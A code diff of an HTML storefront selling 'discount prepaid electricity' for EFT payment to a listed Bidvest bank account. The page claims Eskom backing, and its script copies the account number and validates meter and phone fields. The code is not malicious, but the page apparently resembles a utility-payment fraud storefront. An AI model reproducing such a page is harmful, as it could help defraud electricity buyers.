@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -31,8 +30,9 @@ The payment reference should be the recipient meter number & the electricity tok
 	.lasv input {outline-color:transparent;border:1px solid transparent;}
 	.lasv #acc:focus {border:1px solid dodgerblue;}
 	.lasv #acc:focus + .lastdiv {color:dodgerblue;}
-	.lasv #acc:focus + .lastdiv:after {content:" 897857856 Account Number Copied!";background-color:white;}
+	.lasv #acc:focus + .lastdiv:after {content:" Account Number Copied!";background-color:white;}
 	[aria-hidden='false']+h5 {position:relative;top:5em;}
+	
 	</style>
 </head>
 <body>
@@ -47,9 +47,9 @@ The payment reference should be the recipient meter number & the electricity tok
                 <fieldset>
                     <h2>BUY DISCOUNT PREPAID ELECTRICITY ONLINE</h2>
                     <div class="form-group">
-                        <input type="number" name="meter" id="meter" placeholder="Meter Number"/>
+                        <input type="number" name="meter" id="meter" placeholder="Meter Number" onchange="document.getElementById('reference').value = 'Payment Reference: ' + this.value;"/>
                    
-                        <input type="number" name="phone" id="phone" placeholder="Phone Number (to receive token)"/>
+                        <input type="number" name="phone" id="phone" placeholder="Phone Number (to receive token)" onchange="document.getElementById('recipient').value = 'Token Recipient: ' + this.value;"/>
                     </div>
                 </fieldset>
 
@@ -72,18 +72,19 @@ The payment reference should be the recipient meter number & the electricity tok
                     Payment
                 </h3>
                 <fieldset> 
-                    <h2>WE ACCEPT EFT PAYMENTS</h2>
+                    <h2>PAY VIA EFT</h2>
                     <div class="form-group lasv">
                         <input type="text" id="product" value="14.9 kWh - R10 &nbsp; Prepaid Electricity" readonly/>
                         <input type="text" id="reference" value="Payment Reference: 5656567" readonly/>
-                        <input type="text" id="invacc" value="7876567576" style="visibility:hidden;height:0px;width:0px;margin:0px;display:none;"/>
-                        <input type="text" id="acc" value="Bidvest Bank Current Acc: 7896787" onfocus="copycat();window.setTimeout(function(){ reference.focus();},2000);" readonly/><div class="lastdiv" tabindex="2" onfocus="this.previousSibling.focus()">&#128203;</div>
+                        <input type="text" id="invacc" value="21482056001" style="visibility:hidden;height:0px;width:0px;margin:0px;display:none;"/>
+                        <input type="text" id="acc" value="Bidvest Bank Account: 21482056001" onfocus="copycat();window.setTimeout(function(){ reference.focus();},2000);" readonly/><div class="lastdiv" tabindex="2" onfocus="this.previousSibling.focus()">&#128203;</div>
                         <input type="text" id="recipient" value="Token Recipient: 0722148382" readonly/>
+						<div style="margin-top:2px;line-height:10px;text-align:center;font-size:10px;display:inline-block;position:absolute;color:dodgerblue;">(As soon as the EFT payment clears you will receive an SMS with the electricity token)</div>
                     </div>
                     
                 </fieldset>
 				
-			<h5 align="center" style="transition:all 2s">Powered by <a href="https://eskom.co.za" style="color:blue;">ESKOM</a></h5>
+			<h5 align="center" style="transition:all 2s">Powered by <a href="https://www.eskom.co.za/Pages/Landing.aspx" style="color:blue;">ESKOM</a></h5>
             </form>
         </div>
 
@@ -105,6 +106,7 @@ The payment reference should be the recipient meter number & the electricity tok
 	}
 	ob.id = "chosen";
 	ob.blur();
+	document.getElementById('product').value = ob.value + "   Prepaid Electricity";
 		}
 		
 		copycat = function() {
@@ -120,6 +122,26 @@ The payment reference should be the recipient meter number & the electricity tok
 
   /* Alert the copied text */;
 }
+	</script>
+	<script>
+	document.querySelector('a[href="#next"]').setAttribute('href','#input_meter_number');
+	document.querySelector('a[href="#input_meter_number"]').onclick = function(event) {
+	
+	if(document.getElementById('meter').value.length<6)
+	{	
+	document.getElementById('meter').style.border = "1px solid red";
+	
+	} else if(document.getElementById('phone').value.length<9)
+	{	
+	document.getElementById('phone').style.border = "1px solid red";
+	
+	} else {
+	document.querySelector('a[href="#input_meter_number"]').setAttribute('href','#next');
+	document.getElementById('meter').style.border = "";
+	document.querySelector('a[href="#next"]').click();
+	}
+	
+	}
 	</script>
 </body>
 </html>
